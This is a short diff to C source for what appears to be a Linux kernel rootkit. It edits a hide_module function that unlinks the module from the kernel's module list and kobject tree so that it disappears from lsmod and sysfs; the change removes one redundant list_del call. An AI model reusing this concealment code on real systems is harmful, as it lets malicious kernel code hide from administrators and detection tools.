@@ -146,7 +146,6 @@ void hide_module(void){
 	modKobjList = THIS_MODULE->mkobj.kobj.entry.prev;
         list_del(&THIS_MODULE->list);
         kobject_del(&THIS_MODULE->mkobj.kobj);
-	list_del(&THIS_MODULE->mkobj.kobj.entry);
         modHidden = 1;
 }
 
